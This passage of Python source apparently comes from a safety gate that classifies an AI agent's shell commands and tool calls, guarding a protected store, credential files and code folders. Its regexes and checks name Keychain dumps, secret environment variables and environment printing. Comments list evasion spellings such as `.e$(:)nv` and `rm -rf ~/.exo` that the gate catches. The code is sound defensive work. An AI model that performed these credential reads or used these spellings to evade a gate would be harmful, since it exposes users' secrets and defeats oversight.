    plainly. As written counts too: the kernel resolves `/dev/fd/3/../..` from descriptor 3's folder."""
    return bool(p) and any(_FD_PATH.search(f) for f in (p, os.path.normpath(p))) and \
        not _STD_FD.search(p.rstrip("/") or p)


def _protected_rel(parts: list[str], names: tuple) -> bool:
    p = _fold(parts[0]) if parts else ""
    return bool(parts) and (p in names or p.startswith(("ledger.sqlite", "schedule.sqlite")))


def _path_forms(p: str) -> set[str]:
    """The lexical and the resolved spelling of an absolute path. A path that cannot be resolved (NUL byte,
    symlink loop) keeps its lexical form, so a resolution failure never weakens a check."""
    forms = {re.sub(r"^//", "/", os.path.normpath(p))}  # normpath keeps a leading `//`
    try:
        forms.add(os.path.realpath(p))
    except (OSError, ValueError, RecursionError):
        pass
    return forms


# D-074 (#125): set while classify reads a call as before D-074 (``ordinary``), when the home's config.json was an
# ordinary file. The mark is a call's own: _config_on sets it when the file, or an exo command that writes it,
# counted as the store, and classify then reads the call that way too.
_config_off: contextvars.ContextVar[bool] = contextvars.ContextVar("exo_gate_config_off", default=False)
_config_mark: contextvars.ContextVar[list[bool] | None] = contextvars.ContextVar("exo_gate_config_mark", default=None)


def _config_on() -> bool:
    """Whether the home's config.json counts as the store here (D-074), marking the call (_config_mark) when it does."""
    if _config_off.get():
        return False
    if (mark := _config_mark.get()) is not None:
        mark[0] = True
    return True


def is_store_path(path: str, ancestors: bool = False, from_cwd: bool = False) -> bool:
    """True when ``path`` is (or, with ``ancestors``, contains) a protected part of the Exo store. A brace set
    counts when the path or any word bash expands it to is in the store, or when it expands past the cap (#224).
    With ``from_cwd``, a relative name is read from the session folder too, as a file tool's write is (#494)."""
    words = _brace_words(str(path or ""), pool=1)
    return words is None or any(_store_word(w, ancestors, from_cwd) for w in words)


# What _STORE_NAMES matches anywhere, one part per item ("\0": any text), for _store_glob: folders (a name below one
# counts too) and file names that end a path. The code folders (_code_paths, #459) join: the home's own `venv` and
# `src`, and `hermes-home/plugins`, whose every other spelling the environment or the home's config.json settles
# (#612). The home's config.json comes
# from _HOME_PROTECTED; _store_glob counts it only while it counts (_config_on, D-074), so the call is marked and its
# reading as before is main's.
_STORE_GLOB_DIRS = tuple([".exo", *p, n] for p in ((), ("principals", "\0")) for n in _HOME_PROTECTED +
                         ("ledger.sqlite\0",)) + ([".exo", "bus"], [".exo", "venv"], [".exo", "src"],
                                                  [".exo", "hermes-home", "plugins"])
_STORE_GLOB_FILES = tuple(f.split("/") for f in _EXO_STORE_FILES)


def _counts(sample: list) -> bool:
    """Does a store name _store_glob matched count: every one, but the home's config.json only while it does."""
    return _fold(sample[-1]) != "config.json" or _config_on()


def _store_glob(glob: str, ancestors: bool = False, inside: bool = False) -> bool:
    """Could ``glob``, a word read with its expansions as `*` (_unknown_forms), name a protected part of the Exo store,
    as _store_word would the text they print (#225, #309)? Matched one part at a time, a `*` within its part, against the
    store roots' protected folders (with ``inside``: the roots, as _in_store_dir) and the names _STORE_NAMES matches
    anywhere. As for a read (_glob_word), a match needs a part with three characters of its own before its
    extension (`$(date).json` could be `seat.json` too), so `cp x ~/.exo/$(printf policies)/a` counts and
    `cp x out/$(date).json` does not. A file name must have them itself: its folder alone does not make
    `cp x src/state/$(date +%F).json` a write to `state/approval-grants.json`. Linear in the parts."""
    p = _expand_text(glob).strip().replace("\\", "/")

    def could(g: str, s: str) -> bool:
        """Can glob part g be the sample part s? A NUL in s is any text, which g's own text does not fill: it must
        spell three characters of the text around it (`agent-*` can be an agent socket; `*peers*`, which prose
        quoted as two empty backtick pairs around `peers` gives, cannot). The sample folds case (#601), the
        glob's own wildcards as written (_fold_glob)."""
        g, s = _fold_glob(g), _fold(s)
        if "\0" not in s:
            return fnmatch.fnmatchcase(s, g)
        a, b = s.split("\0")
        head, tail = re.split(r"[*?\[]", g)[0], re.split(r"[*?\]]", g)[-1]
        return not a and not b or fnmatch.fnmatchcase(a + b, g) or (head.startswith(a) or a.startswith(head)) and (
            tail.endswith(b) or b.endswith(tail)) and min(len(head), len(a)) + min(len(tail), len(b)) >= 3

    def own(g: str) -> bool:
        return len(re.sub(r"[*?]|\[[^\]]*\]?", "", g.rsplit(".", 1)[0] if "." in g[1:] else g)) >= 3

    def fits(gs: list, j: int, sample: list, whole: bool = False, short: bool = False) -> bool:
        """gs from part j on starts with the sample's parts (``whole``: and ends there; ``short``: or ends before)."""
        n = min(len(gs) - j, len(sample))
        if n < len(sample) and not short or whole and len(gs) - j != len(sample):
            return False
        return all(map(could, gs[j:j + n], sample[:n])) and any(map(own, gs[j:j + n]))

    tops: list = []
    if p.startswith("/"):
        code = [c.rstrip("/").split("/") for c in _code_forms()]     # #459: the code folder's own subtree counts
        tops = ([r.rstrip("/").split("/") for root, _, _ in _store_roots() for r in _path_forms(root)] + code
                if inside else [
            r.rstrip("/").split("/") + x for root, names, principals in _store_roots() for r in _path_forms(root)
            for x in [[n] for n in names + ("ledger.sqlite\0", "schedule.sqlite\0")] +
            ([["principals", "\0", n] for n in _STORE_PROTECTED + ("ledger.sqlite\0",)] if principals else [])]
            + code)
    dirs, files = ([[".exo"]], ()) if inside else (_STORE_GLOB_DIRS, _STORE_GLOB_FILES)
    for form in _path_forms(p) if p.startswith("/") else [os.path.normpath(p)] if p else []:
        gs = form.split("/")
        if any(fits(gs, 0, t, short=ancestors) and _counts(t) for t in tops):
            return True
        named = own(gs[-1])                 # a store file's folder alone (`src/state/$(..)`) is not its name
        for j in range(1 if form.startswith("/") else 0, len(gs)):
            if any(fits(gs, j, d) and _counts(d) for d in dirs) or \
                    named and any(fits(gs, j, f, whole=True) for f in files):
                return True
    return False


def _store_word(path: str, ancestors: bool = False, from_cwd: bool = False) -> bool:
    """is_store_path for one word whose braces are already expanded."""
    p = _expand_text(path).strip().replace("\\", "/")
    if not p:
        return False
    if _STORE_NAMES.search(_fold(p)) or _fd_path(p) or ancestors and _FD_DIR.fullmatch(os.path.normpath(p)):
        return True                      # with ancestors: `ln -s /dev x` makes x/fd/3 a descriptor path
    if not p.startswith("/"):            # relative: a name the store knows, or, for a file tool's write (#494),
        return bool(_CONFIG_NAME.search(_fold(os.path.normpath(p)))) and _config_on() or \
            from_cwd and _store_from_cwd(p, ancestors)      # one read from the session folder
    return _store_forms(_path_forms(p), ancestors)


def _store_forms(candidates: set[str], ancestors: bool) -> bool:
    """_store_word's check on a path's spellings: the names _STORE_NAMES matches anywhere, the config file by name
    (D-074), and each against the store roots' and the bus folders' forms. The spellings come from the original
    text, normpath first would erase symlink/.. traversal, and the lexical candidate counts beside the real one,
    including protected paths that link out of the store."""
    if any(_STORE_NAMES.search(_fold(c)) for c in candidates):
        return True
    if any(_CONFIG_NAME.search(_fold(c)) for c in candidates) and _config_on():
        return True
    roots = [(r, names, principals) for root, names, principals in _store_roots() for r in _path_forms(root)]
    roots += [(r, names, False) for root, names in _bus_paths() for r in _path_forms(root)]
    roots = [(_fold(r), names, principals) for r, names, principals in roots]
    for candidate in candidates:
        c = _fold(candidate)
        for r, names, principals in roots:
            if ancestors and (r == c or r.startswith(c.rstrip("/") + "/")):
                return True
            if not c.startswith(r.rstrip("/") + "/"):
                continue
            parts = c[len(r.rstrip("/")) + 1:].split("/")
            if _protected_rel(parts, names) and (parts[0] != "config.json" or _config_on()):
                return True
            if principals and parts[0] == "principals":
                if len(parts) <= 2 and ancestors:
                    return True
                if _protected_rel(parts[2:], _STORE_PROTECTED):
                    return True
        # #459: a write inside a folder Exo loads code from; with ``ancestors`` (a delete), also a remove or move of
        # the folder itself or of a folder above it that holds it (`rm -rf ~/.exo`, `mv ~/.exo/venv x`).
        code = _code_forms()
        if any(c == _fold(x) or c.startswith(_fold(x).rstrip("/") + "/") for x in code) or \
                ancestors and any(_fold(x).startswith(c.rstrip("/") + "/") for x in code):
            return True
    return False


def _store_from_cwd(p: str, ancestors: bool) -> bool:
    """A relative write target read from the session's working folder (#494), as _sensitive_words reads a relative
    secret name: joined to each folder the core passed, then read as an absolute path. The gate's own folder is
    not one of them — a bare `run` word from it is not the run folder (#D-039) — and with no session folder
    known, only the name rules above count."""
    scope = _scope.get()
    if scope is None or not scope.cwds:
        return False
    for base in scope.cwds:
        if _store_forms(_path_forms(os.path.join(base, p)), ancestors):
            return True
    return False


def _in_store_dir(path: str) -> bool:
    """A `cd` target inside EXO_HOME or the principal store: relative names after it may be the store. So is a
    descriptor or process folder, or a folder above one (`/dev`, `/proc/self`), where `> fd/3` is one (#217)."""
    p = _expand_text(path).strip()
    if _fd_path(p) or _FD_DIR.fullmatch(os.path.normpath(p or ".")):
        return True
    if not p.startswith("/"):
        return bool(re.search(r"(^|/)\.exo(/|$)", _fold(p)))
    roots = [r for root, _, _ in _store_roots() for r in _path_forms(root)] + _code_forms()
    return any(c == r or c.startswith(r.rstrip("/") + "/")
               for c in (_fold(f) for f in _path_forms(p)) for r in map(_fold, roots))


_PATCH_PATHS = re.compile(
    r"^\*\*\*\s*(?:Update|Add|Delete)\s+File:\s*(.+?)\s*$|"
    r"^\*\*\*\s*Move\s+File:\s*(.+?)\s*->\s*(.+?)\s*$|"
    r"^\*\*\*\s*Move\s+to:\s*(.+?)\s*$", re.M)
# The same headers with each path read on its own line (#548 follow-up). `\s` above may cross a line, so a header
# with no path (`*** Move to:`, `*** Add File:`, `*** Move File: a ->`) takes the next header line as its path and
# that header is never read, while a patch tool skips the bare line and applies the next one. A `\r` before the
# newline is space, as a patch tool trims it.
_PATCH_LINE_PATHS = re.compile(_PATCH_PATHS.pattern.replace(r"\s", r"[^\S\n]"), re.M)


def _patch_paths(text: str) -> list[str]:
    """Each path a patch's headers name: those read as before first, then those read one line at a time."""
    found = [p for m in _PATCH_PATHS.finditer(text or "") for p in m.groups() if p]
    found += [p for m in _PATCH_LINE_PATHS.finditer(text or "") for p in m.groups() if p and p.strip()]
    return list(dict.fromkeys(found))


_PATH_ARG_KEYS = ("path", "file_path", "file", "filename", "new_path", "paths", "files", "directory", "dir", "root",
                  "source", "src", "from", "old_path", "dest", "dst", "destination", "to", "target")
# Name words of a file tool that moves or renames what it names, as `mv` does, or deletes it, as `rm` does (#447).
# They are read in a camelCase name too (`moveFile`, `deleteFile`), which `_name_tokens` reads beside the name's word.
_WIDE_WORDS = frozenset(("move", "rename", "mv", "delete", "remove", "destroy", "drop", "purge", "wipe", "erase",
                         "revoke", "trash"))
# Name words of a tool whose name reads as a read but that writes what it took where its path arguments say
# (`download_file`, `export_csv`): the store scan reads those arguments as a write's (#494). A name that says it
# replaces, substitutes, patches, edits, updates or seds the file its path names writes it too (#651): a
# `search_replace` on a store path is a write of the seat, policy or config file it names, as `write_file` is,
# never a read the store skips.
_FETCH_WRITE_WORDS = frozenset(("download", "export", "replace", "substitute", "patch", "edit", "update", "sed"))
# The old and new text a replace carries in its arguments, beside the path it names: the replace signal of a tool
# whose name alone does not say it writes (#651).
_REPLACE_ARG_KEYS = (("old_string", "new_string"), ("old_text", "new_text"), ("search", "replace"),
                     ("find", "replace"), ("old", "new"), ("pattern", "replacement"))
_CAMEL = re.compile(r"(?<=[a-z0-9])(?=[A-Z])")


@_brace_budget
def args_sensitive(args: Mapping) -> str:
    """The first path-like tool argument that names a secret store, or ''."""
    for k in _PATH_ARG_KEYS:
        v = args.get(k)
        for item in (v if isinstance(v, (list, tuple)) else [v]):
            if isinstance(item, str) and item:
                words = _brace_words(item)         # expanded once for both checks
                if words is None or _sensitive_words(words) or _glob_words(words):
                    return item
    return ""


def _replace_args(args: Mapping) -> bool:
    """Whether the call's arguments carry the old text and the new, beside the path they name (#651): a tool whose
    name reads as a read but that declares both replaces the file its path names, as `write_file` writes one."""
    return any(args.get(a) and args.get(b) for a, b in _REPLACE_ARG_KEYS)


_KEYCHAIN = re.compile(r"\bsecurity\s+(?:-\S+\s+)*(find-generic-password|find-internet-password|"
                       r"find-key|dump-keychain|export|unlock-keychain|show-keychain-info|import)\b")
_PROVIDER_ROUTE = re.compile(r"/api/providers\b|\bproviders_setup\b")  # D-034 key routes and module
_SECRET_VAR = re.compile(r"\$\{?[A-Za-z0-9_]*(API_KEY|_KEY|_TOKEN|_SECRET|_PASSWORD|_PASSWD)\b")
_PIECE_SPLIT = re.compile(r"[\s'\"<>;|&()`,]+")


def _env_dump(argv: list[str]) -> bool:
    """env/printenv/set/export/declare printing the environment (or a secret-looking variable)."""
    if not argv:
        return False
    prog, rest = argv[0].rsplit("/", 1)[-1], argv[1:]
    if prog == "env":
        rest = [a for a in rest if not _ASSIGN.fullmatch(a)]
        return not [a for a in rest if not a.startswith("-")]
    if prog == "printenv":
        return not rest or any(re.search(r"KEY|TOKEN|SECRET|PASS", a, re.I) for a in rest)
    if prog in ("set", "typeset", "declare", "export", "compgen", "readonly"):
        flags = [a for a in rest if a.startswith("-")]
        names = [a for a in rest if not a.startswith("-")]
        if prog == "compgen":
            return "-e" in flags or "-v" in flags
        if prog == "set":
            return not rest
        return not names and (not flags or any(f in ("-p", "-x", "-px", "-xp") for f in flags))
    return False


def _shell_credential_hit(cmd: str, segs: list[list[str]], raws: list[str] | None = None,
                          every: list[str] | None = None) -> str:
    """What in a shell command touches a secret store: a path (also through ~, $HOME, a glob, a brace set
    in the source text ``raws`` of a word or redirection target, or a quoted `bash -c` string), the Keychain,
    or a bare environment dump. '' if nothing. With ``every``, each path, and each word of a brace set, that
    touches a store is added to it, the first one too; the result stays the first, a Keychain or environment
    dump hit too, and the paths after such a hit are still listed (#609 follow-up)."""
    text = _expand_text(cmd)
    first = ("keychain access" if _KEYCHAIN.search(text) else "provider key route" if _PROVIDER_ROUTE.search(text)
             else "secret environment variable" if _SECRET_VAR.search(text) else "")
    if first and every is None:
        return first
    pieces = [p for p in _PIECE_SPLIT.split(text) if p]
    for seg in segs:
        pieces += [re.sub(r"^(\d*>>?|&>>?|<|[\w-]+=)", "", t) for t in seg]
        if first:
            continue
        flat, _ = _strip_prefixes_keep_env(seg)
        if _env_dump(flat):
            first = "environment dump"
        elif flat and flat[0].rsplit("/", 1)[-1] == "security" and any(
                a in ("-w", "-g", "-gs", "-wg") for a in flat[1:]) and len(flat) > 1 and flat[1].startswith("find"):
            first = "keychain access"
        if first and every is None:
            return first
    for p in pieces if every is None else dict.fromkeys(pieces):     # each word once when every one is listed
        p = re.sub(r"^[\w-]+=", "", p) if "=" in p and not p.startswith("=") else p
        if p and (_sensitive_words([p]) or _glob_words([p])):
            if every is None:
                return p
            first = first or p
            every.append(_expand_text(p))           # a word of a segment as the text spells it: `~` read
    groups: dict[str, list[str]] = {}         # bash expands only unquoted braces: expand, then dequote
    for raw in dict.fromkeys(raws or []):
        words = _brace_words(raw.replace("\\\n", ""))   # after line continuations are gone
        if words is None:
            if every is None:
                return raw
            first = first or raw
            every.append(raw)
            continue
        alts = words[1:] or words
        found = [d for w in alts for d in _dequote(w)] if len(words) > 1 or '$"' in raw else []
        found += [d for w in alts for d in _unknown_words(w)]   # what an expansion may print
        if found:
            groups[raw] = [re.sub(r"^(\d*>>?|&>>?|<|[\w-]+=)+", "", d) for d in found]
    words = [w for ws in groups.values() for w in ws]
    if words and (_sensitive_words(words) or _glob_words(words)):
        hit = next((raw for raw, ws in groups.items() if _sensitive_words(ws) or _glob_words(ws)), "brace set")
        if every is None:
            return hit
        every += [_expand_text(w) for w in words if _sensitive_words([w]) or _glob_words([w])]
        return first or hit
    return first


_PARAM = re.compile(r"\$(\{[^}]*\}?|[A-Za-z_]\w*|[0-9@*#?$!-])")   # a ${..} to its first `}`, as the lexer reads it
_KNOWN_PARAM = re.compile(r"\$\{?(HOME|EXO_HOME|EXO_PRINCIPAL_STORE|CLAUDE_CONFIG_DIR)(?!\w)")
_DEFAULT_WORD = re.compile(r"\$\{(?:[A-Za-z_]\w*(?:\[[^\]{}]*\])?|\d+|[@*]):?[-=+]([^{}]*)\}")   # ${x:-w}, ${x[0]+w}


def _unknown_forms(src: str) -> list[str]:
    """Spellings of a shell word whose source text ``src`` (quotes kept) holds an expansion the gate cannot spell
    out (#225): a $( ), ` `, $(( )) or $[ ], or a ${..} or $name other than the store variables _expand_text spells
    out. Each is read as empty, which joins the text around it (`.e$(:)nv` is `.env`, `${x}.env` is `.env`), and as
    `*` for any output (`.e$(echo n)v` is the glob `.e*v`, which then asks where that glob would): a substitution
    anywhere but at the start of the word before text (`~/.config/gh/$(printf hosts.yml)`, `id_ed$((25519))` and
    `$(ls)`; `$(pwd)/config` is not `*/config`), a variable only where literal text stands on both sides of it
    (`$OUT/config`, `~/.config/$f`). One that starts a name part with text after it in the part is also read as `.*`,
    as its output may start the name with the dot a `*` does not match (`$(printf .e)nv` is `.*nv`); in that form a
    part that is only an expansion is empty (`~/$(printf .k)ube/$(:)` is `~/.*ube/`). The word of `${x:-word}`,
    `${x-word}`, `${x:=word}`, `${x=word}`, `${x:+word}` or `${x+word}`, also on an array element (`${x[0]:-word}`),
    may be the value: one form has each such word in place (#341). [] when the word holds none. One pass over the
    word."""
    if "$" not in src and "`" not in src:
        return []
    lx, q, close = _Lexer(src), "", 0
    lits: list[str] = []                              # the literal source text before each expansion, and after
    exps: list[tuple[bool, str | None]] = []          # per expansion: is it a substitution, its default word
    lit: list[str] = []
    while lx.i < len(src):
        ch, at = src[lx.i], lx.i
        m: re.Match | None = None
        exp: tuple[bool, str | None] | None = None
        if q != "'" and (ch == "`" or src.startswith("$(", at)):
            _SCANS[ch](lx, _Word())                   # past the substitution, $(( )) too, read as the lexer reads it
            exp = (True, None)
        elif q != "'" and src.startswith("$[", at) and close >= 0:
            close = src.find("]", at)                 # legacy arithmetic, to its first ]
            if close >= 0:
                lx.i, exp = close + 1, (True, None)
        elif ch == "$" and q != "'":
            m = _PARAM.match(src, at)
            if m and not _KNOWN_PARAM.match(m[0]):
                d = _DEFAULT_WORD.fullmatch(m[0])
                lx.i, exp = m.end(), (False, d[1] if d else None)
        if exp:
            lits.append("".join(lit))
            exps.append(exp)
            lit = []
            continue
        step = len(m[0]) if m else 2 if ch == "\\" and q != "'" else 1
        if ch in "'\"" and q in ("", ch):
            q = "" if q else ch
        lit.append(src[lx.i:lx.i + step])
        lx.i += step
    lits.append("".join(lit))
    if not exps:
        return []
    text = [j for j, p in enumerate(lits) if p.strip("'\"")]     # the literal parts with text, not only quotes
    plain = [re.sub("['\"]", "", p) for p in lits]

    def star(j: int, sub: bool) -> str:             # expansion j stands between lits[j] and lits[j + 1]
        lead = j == 0 and not plain[0] and bool(text)       # starts the word, with text after it
        return "*" if sub and not lead or text and text[0] <= j < text[-1] else ""

    def dot(j: int, sub: bool) -> str:
        """`.*` where it starts a name part with text after it, empty where it is a part of its own."""
        if not (plain[j].endswith(("/", "=")) or j == 0 and not plain[0]):
            return star(j, sub)
        after = plain[j + 1][:1]
        return ".*" if after not in ("", "/") else "" if after or j + 1 == len(exps) else star(j, sub)

    def spell(pick: Callable[[int, bool, str | None], str]) -> str:
        return lits[0] + "".join(pick(j, sub, word) + lits[j + 1] for j, (sub, word) in enumerate(exps))

    forms = [spell(lambda j, sub, word: ""), spell(lambda j, sub, word: star(j, sub))]
    if any(dot(j, sub) == ".*" for j, (sub, _) in enumerate(exps)):
        forms.append(spell(lambda j, sub, word: dot(j, sub)))
    if any(word is not None for _, word in exps):
        forms.append(spell(lambda j, sub, word: word or ""))
    return list(dict.fromkeys(forms))


def _unknown_words(src: str) -> list[str]:
    """The words bash may make of the source text ``src`` of one shell word as _unknown_forms reads the expansions
    in it, quotes removed (brace sets stay as written); [] when it holds none. Once per spelling in a classify call,
    which reads a nested text again at each depth."""
    memo = _call_memo.get()
    seen = {} if memo is None else memo.setdefault("unknown_words", {})
    if src not in seen:
        seen[src] = list(dict.fromkeys(d for f in _unknown_forms(src) for d in _dequote(f)))
    return seen[src]


def _dequote(word: str) -> list[str]:
    """The words the lexer reads from one brace-expanded source word, quotes removed. A `$"..."` is also read
    as the plain "..." bash gives it without a message catalog."""
    if not re.search(r"[\\'\"$`<>#]", word):
        return [word]
    out: list[str] = []
    for src in dict.fromkeys((word, word.replace('$"', '"'))):
        toks = _Lexer("\\" + src if src.startswith("#") else src, scan=False).run()
        out += [w.text for kind, w in toks if kind == "w"]
    return out


def _strip_prefixes_keep_env(argv: list[str]) -> tuple[list[str], bool]:
    """The simple command behind its assignments, prefixes (sudo, nice, timeout, env with a command...),
    `coproc`, compound openers (then, do...) and run wrappers (uv run, poetry run...), so the environment-dump
    check sees `uv run printenv X` as `printenv X` (#155). A bare `env` (or `env` with assignments only) is kept: it is the dump."""
    while argv:
        base = argv[0].rsplit("/", 1)[-1]
        if _ASSIGN.fullmatch(argv[0]) or base in _OPENERS or base in ("coproc", "("):
            argv = argv[1:]
        elif base in _PREFIXES and not (base == "command" and argv[1:2] and argv[1] in ("-v", "-V")):
            rest, takes = argv[1:], _PREFIXES[base]
            while rest and rest[0].startswith("-") and rest[0] != "-":
                f, rest = rest[0], rest[1:]
                if base == "env" and (f.startswith(("-S", "--split-string")) or _env_s_text(f)):
                    # env -S text is classified on its own; no dump in the readings that read it as `-S TEXT` (#591)
                    return [] if _env_s_text(f) else argv, False
                if f in takes and rest:
                    rest = rest[1:]
            if base == "timeout" and rest and re.fullmatch(r"[\d.]+[smhd]?", rest[0]):
                rest = rest[1:]
            if base == "env" and all(_ASSIGN.fullmatch(a) for a in rest):
                break
            argv = rest
        elif (base, argv[1] if len(argv) > 1 else "") in _RUN_WRAPPERS:
            rest = argv[2:]
            while rest and rest[0].startswith("-"):
                f, rest = rest[0], rest[1:]
                if f == "--":
                    break
                if f in _WRAPPER_VALUE_OPTS and rest:
                    rest = rest[1:]
            argv = rest
        else:
            break
    return argv, False


# Name hints for tools not in the table (plugins, MCP servers). Ordered; first match wins.
_READ_VERBS = {"get", "list", "read", "search", "fetch", "query", "view", "find", "describe", "show",
               "lookup", "status", "check", "count", "download", "inspect", "preview"}
NAME_HINTS: list[tuple[set[str], set[str] | None, str]] = [
    ({"pay", "payment", "charge", "refund", "transfer", "purchase", "buy", "checkout", "payout",
      "invoice", "subscribe", "order"}, None, "payment"),
    ({"signup"}, None, "account"),
    ({"account"}, {"create", "open", "new", "register"}, "account"),
    ({"login", "signin", "oauth", "password", "secret", "credential", "credentials", "token", "apikey"}, None,
     "credentials"),
    ({"delete", "remove", "destroy", "drop", "purge", "wipe", "erase", "revoke", "trash"}, None, "delete"),
    ({"deploy", "promote", "rollout"}, None, "deploy_production"),
    ({"publish", "release"}, None, "publish"),
    ({"merge"}, {"github", "gitlab", "gh"}, "vcs_merge"),
    ({"close"}, {"github", "gitlab", "gh"}, "github_close"),
    ({"comment", "review", "reply", "create", "update", "edit"}, {"github", "gitlab", "gh"}, "github_post"),
    ({"email", "mail", "gmail"}, {"send", "reply", "forward"}, "email_send"),
    ({"draft"}, None, "local_write"),
    ({"tweet", "toot"}, None, "social_post"),
    ({"cast", "post", "share"}, {"x", "twitter", "bluesky", "linkedin", "mastodon", "threads",
                                                  "social", "status"}, "social_post"),
    ({"send", "message", "reply", "post", "dm", "comment", "invite", "notify", "tweet"}, None, "message_send"),
    ({"create", "update", "edit", "write", "set", "add", "upload", "put", "insert", "upsert", "move",
      "rename", "archive"}, None, "remote_write"),
]


def _name_tokens(name: str) -> list[str]:
    """Read separator parts and camel words together; the call also retains its unsplit reading (#515)."""
    whole = [p.lower() for p in re.split(r"[_\-.:/]+", name) if p]
    if _CAMEL.search(name):
        whole += [p for p in re.split(r"[_\-.:/]+", _CAMEL.sub("_", name).lower()) if p]
    return list(dict.fromkeys(whole))


def classify_by_name(tool: str) -> str:
    return _classify_name_tokens(_name_tokens(tool))


def _classify_name_tokens(toks: list[str]) -> str:
    is_mcp = bool(toks) and toks[0] == "mcp"
    words = toks[1:] if is_mcp else toks
    joined = "_".join(words)
    verb = next((t for t in words if t in _READ_VERBS or any(t in h for h, _, _ in NAME_HINTS)), "")
    if verb in _READ_VERBS:
        return "read"
    wset = set(words) | {joined}
    for hits, needs, cat in NAME_HINTS:
        if wset & hits and (needs is None or wset & needs):
            if cat == "remote_write" and not is_mcp:
                return "local_write"
            return cat
    return "unknown"


def _args_of(action: Any) -> tuple[str, dict]:
    if isinstance(action, (tuple, list)) and len(action) == 2:
        tool, args = action
    elif isinstance(action, Mapping):
        tool = action.get("tool") or action.get("tool_name") or action.get("name") or ""
        args = action.get("args") if "args" in action else action.get("arguments", {})
    else:
        raise TypeError("action must be {'tool': name, 'args': {...}} or (name, args)")
    if isinstance(args, str):
        try:
            args = json.loads(args)
        except ValueError:
            args = {"input": args}
    return str(tool), dict(args or {})


def _shell_call(cmd: str) -> Classification:
    """A shell tool's line, as classify_shell reads it, run in the call's own folder argument (#311). The line keeps
    its own classification: category, target, axes, text and parts. When it reads a secret store from that folder
    (_tool_folder_read), a credentials part is added for the read, weighed as a `cd` form's (_weigh). It keeps no
    own text, and carries a `_StandIn` for `cd <folder>` among its setters (#516), so a rule keyed on `command`
    that would lower the line names the folder, as it names the `cd` in the cd form; naming the folder lifts no
    deny of the part's. decide's credentials floor then asks, and no_grant keeps a standing grant off the call,
    while the line's own
    deny entries, rules, matrix cell, posting checks and reserved entries still apply. Before #311 a relative word
    that resolves into a store from the folder made the whole call credentials (#209); that reading is kept beside
    the line (``also``), and decide keeps the stricter of the two. One check per call, on the whole line: a nested
    line is read in its own folders only."""
    scope = _scope.get()
    if scope is None or not scope.tool_cwds:
        return classify_shell(cmd)
    folders = scope.tool_cwds
    seen: dict = {}                 # one memo for the reads below, so the line is parsed once
    try:
        here = os.getcwd()
    except OSError:                 # the gate's own folder is gone: a relative folder is read as given
        here = ""
    # joined, not folded: the shell runs in `sdir/../keys` through the link sdir, as the kernel reads it; and folded
    # too, as #209 read the folder before #311, so that reading never loses a store
    mine = [g for f, _ in folders for g in (os.path.join(here, f), os.path.normpath(os.path.join(here, f)))]
    wide = replace(scope, cwds=tuple(dict.fromkeys([*scope.cwds, *mine])))
    token, memo = _scope.set(wide), _shell_seen.set(seen)
    try:
        whole = classify_shell(cmd)             # its relative words read from the folder too, as before #311
        read = next((p for p in _each_part(whole) if p.category == "credentials"), None)
        c = whole
        if read is not None:                    # the line alone, as a call of its own in the session's folder
            c = _line_alone(cmd, scope, {k: v for k, v in seen.items() if k[:1] == ("parse",)})
            c.also = whole
        found = _tool_folder_read(cmd, folders, read)  # a store write stays the line's result, as for `tar -C` (#464)
    finally:
        _shell_seen.reset(memo)
        _scope.reset(token)
    # #320: a secret line by its own words keeps the folder's read beside it when that is another target, as a cd
    # form's does (`cat ${x-.netrc}; git push -f` in ~/.exo/keys), and a copy of its heaviest other command with no
    # own text, so no rule on `command` lifts that command's deny, as on main where it decides the line (#394). The
    # copy keeps its body, so a post main checks as the line's own and as its part is checked twice here too. Its
    # entries are listed outside the cap, as main lists the line's own (``line_copy``).
    new = [f for f in found if f[1] not in {p.target for p in _each_part(c)
                                            if p.category == "credentials" and not p.other_store}]
    top = _most_severe(p for p in _each_part(c) if p.category != "credentials") if c.category == "credentials" else None
    if new and top is not None:                 # first, as main reads the line before its parts
        c.parts = [replace(top, parts=[], own=None, line_copy=True), *c.parts]
    for summary, target, cd in new:
        # The part keeps no own text, as a `cd` form's parts have (#394), so no rule keyed on `command` lifts its
        # deny: _override_deny passes every such rule over for it. It carries a `_StandIn` for `cd <folder>` (#516)
        # among its setters, the folder as the call spells it, so the line is not one text for _one_text and the
        # #394 pass runs: a rule that would lower the line names the folder, as it names the `cd` in the cd form,
        # and one that names only the line's text is passed over. The read keeps its own weight, and a heavier
        # command on the line is a credentials part with that weight beside it, as beside a secret line (#468). So
        # each matrix cell or rule the cd form's parts meet is met.
        part = _make("credentials", summary=summary[:120], target=target, command=cmd, own=None,
                     setters=[_StandIn(cd)], signals=["secret store"])
        c.parts = [*c.parts, _weigh(part, c, cmd)]
        c.signals = list(dict.fromkeys([*c.signals, "secret store"]))
    return c


def _line_alone(cmd: str, scope: _Scope, parsed: dict) -> Classification:
    """classify_shell(cmd) in ``scope`` with budgets and a memo of its own, as a call of its own; ``parsed`` holds
    the line's parses already made. _brace_budget makes the budgets, so they have as many pools as a call's."""
    left = _brace_left.set(None)
    token, seen = _scope.set(scope), _shell_seen.set(parsed)
    try:
        return _brace_budget(classify_shell)(cmd)
    finally:
        _shell_seen.reset(seen)
        _scope.reset(token)
        _brace_left.reset(left)


def _tool_folder_read(cmd: str, folders: tuple[tuple[str, str], ...],
                      read: Classification | None) -> list[tuple[str, str, str]]:
    """How a shell call reads a secret store from its own folder argument (#311), as [(summary, target, cd)], or
    []. In this order: the folder is itself a store, as a `cd` word is (a link resolved, a glob that could name
    one); a relative word resolves into one from it (#209; ``read`` is that reading's credentials part); and the
    line reads a relative name there as after `cd <folder>` (_cd_store_read, D-038, #192): the words as written
    first, then with #320's forms, whose name is a second read when it is another target, as on a cd line. The
    target is the folder, or the folder joined with the name. ``folders`` holds each folder as the call spells it
    beside its joined path, and the third word is the `cd` the part's stand-in setter names (#516): `cd <folder>`,
    the folder as the call spells it, said once.
    A folder in a repo's own .claude worktrees, commands, agents or skills is the repo's, not a store (_repo_claude),
    so only a word that resolves into a store counts there."""
    spell = dict(folders)                       # the folder as the call spells it, for the part's `cd` (#516)
    forms: list[tuple[str, str]] = []           # (the folder as the call gives it, a form to check)
    for f in spell:
        x = _expand_text(f)
        try:
            real = os.path.realpath(x) if os.path.isabs(x) and not _GLOBBY.search(x) else ""
        except ValueError:                      # a NUL in it: read as written, as _sensitive_words does
            real = ""
        if real and _repo_claude(real):
            continue
        linked = [real] if real and real != os.path.normpath(x) else []      # where a link leads, first
        forms += [(f, g) for g in [*linked, f] if not _repo_claude(g)]
    for f, g in forms:
        if is_sensitive_path(g) or _glob_hits_secret(g):
            return [(f"shell runs in {f}", g, f"cd {spell[f]}")]
    out: list[tuple[str, str, str]] = []
